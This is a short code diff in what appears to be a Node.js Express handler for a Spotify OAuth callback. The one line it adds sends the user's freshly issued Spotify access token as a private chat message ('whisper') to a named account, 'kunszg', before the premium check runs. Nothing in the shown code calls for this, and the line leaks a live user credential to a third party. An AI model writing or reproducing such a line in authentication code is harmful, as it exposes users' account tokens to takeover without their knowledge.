@@ -231,6 +231,8 @@ app.get("/resolved", async (req, res, next) => {
             },
         }).json();
 
+        kb.whisper('kunszg', spotifyToken.access_token)
+
         const checkPremium = await got(`https://api.spotify.com/v1/me`, {
             method: "GET",
             headers: {
